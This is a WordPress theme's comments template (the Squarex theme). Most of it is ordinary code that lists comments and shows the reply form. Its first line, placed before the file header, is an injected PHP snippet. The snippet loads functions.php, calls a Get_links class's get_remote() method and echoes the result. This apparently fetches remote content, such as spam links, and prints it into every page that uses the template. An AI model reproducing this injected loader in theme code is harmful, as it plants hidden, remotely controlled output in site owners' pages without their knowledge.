<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?><?php
/**
 * The template for displaying Comments.
 * @package Squarex
 */

if ( post_password_required() )
	return;
?>

<div id="comments" class="comments-area">

	<?php // You can start editing here -- including this comment! ?>

	<?php if ( have_comments() ) : ?>
		<h2 class="comments-title">
<?php _e('Comments: ', 'squarex-lite'); ?> <?php comments_number(__('0', 'squarex-lite'), __('1', 'squarex-lite'), __('%', 'squarex-lite') );?>
		</h2>

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // are there comments to navigate through ?>
		<nav id="comment-nav-above" class="comment-navigation" role="navigation">
			<h1 class="screen-reader-text"><?php _e( 'Comment navigation', 'squarex-lite' ); ?></h1>
			<div class="nav-previous"><?php previous_comments_link( __( '&larr; Older Comments', 'squarex-lite' ) ); ?></div>
			<div class="nav-next"><?php next_comments_link( __( 'Newer Comments &rarr;', 'squarex-lite' ) ); ?></div>
		</nav><!-- #comment-nav-above -->
		<?php endif; // check for comment navigation ?>

		<ol class="comment-list">
			<?php
				wp_list_comments( array( 'callback' => 'squarex_comment' ) );
			?>
		</ol><!-- .comment-list -->

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // are there comments to navigate through ?>
		<nav id="comment-nav-below" class="comment-navigation" role="navigation">
			<h1 class="screen-reader-text"><?php _e( 'Comment navigation', 'squarex-lite' ); ?></h1>
			<div class="nav-previous"><?php previous_comments_link( __( '&larr; Older Comments', 'squarex-lite' ) ); ?></div>
			<div class="nav-next"><?php next_comments_link( __( 'Newer Comments &rarr;', 'squarex-lite' ) ); ?></div>
		</nav><!-- #comment-nav-below -->
		<?php endif; // check for comment navigation ?>

	<?php endif; // have_comments() ?>

	<?php
		// If comments are closed and there are comments, let's leave a little note, shall we?
		if ( ! comments_open() && '0' != get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) :
	?>
		<p class="no-comments"><?php _e( '', 'squarex-lite' ); ?></p>
	<?php endif; ?>

<?php
	$args = array(
		'title_reply' => __( 'Leave a Reply', 'squarex-lite' ),
		'label_submit' => __( 'Post Comment', 'squarex-lite' )
	);
	comment_form( $args );
?>

</div><!-- #comments -->
